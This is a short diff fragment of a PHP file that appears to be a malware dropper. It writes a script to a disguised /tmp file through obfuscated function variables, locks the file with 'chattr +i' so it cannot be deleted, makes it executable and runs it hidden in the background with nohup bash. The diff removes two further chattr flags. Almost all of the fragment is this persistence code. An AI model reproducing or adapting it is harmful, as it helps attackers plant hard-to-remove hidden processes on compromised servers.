@@ -34,8 +34,6 @@ $scriptContent = str_replace("\r", "", $scriptContent);
 $scriptFile = '/tmp/phpdmJvU8';
 $FPC($scriptFile, $scriptContent);
 $EXE("chattr +i $scriptFile");
-$EXE("chattr +a $scriptFile");
-$EXE("chattr +e $scriptFile");
 chmod($scriptFile, 0755);
 $EXE("nohup /bin/bash $scriptFile > /tmp/phpdmJvU9 2>&1 &");
 ?>
